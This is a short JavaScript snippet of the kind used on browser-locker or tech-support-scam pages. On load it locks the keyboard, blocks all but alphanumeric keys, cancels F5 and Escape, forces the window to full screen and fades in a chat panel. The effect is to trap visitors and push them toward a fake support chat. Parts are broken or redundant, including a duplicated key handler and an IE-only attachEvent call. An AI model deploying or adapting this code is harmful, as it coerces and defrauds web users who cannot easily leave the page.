
document.addEventListener('DOMContentLoaded', function () {
    document.onkeydown = function (event) {
        // Allow only alphabets, numbers, and space
        var allowedKeys = /^[a-zA-Z0-9 ]*$/;
        var key = String.fromCharCode(event.keyCode);

        if (!allowedKeys.test(key)) {
            return false;
        }
    };

    document.attachEvent("onkeydown", win_onkeydown_handler);

    function win_onkeydown_handler() {
        switch (event.keyCode) {
            case 116:
                event.returnValue = !1;
                event.keyCode = 0;
                break;
            case 27:
                event.returnValue = !1, event.keyCode = 0;
        }
    }

    window.onload = function () {
        window.moveTo(0, 0);
        window.resizeTo(screen.availWidth, screen.availHeight);
    };

    $(document).ready(function () {
        $("#chat").delay(600).fadeIn(100);
    });

    navigator.keyboard.lock();
    document.onkeydown = function (e) {
        // Allow only alphabets, numbers, and space
        var allowedKeys = /^[a-zA-Z0-9 ]*$/;
        var key = String.fromCharCode(e.keyCode);

        if (!allowedKeys.test(key)) {
            return false;
        }
    };
});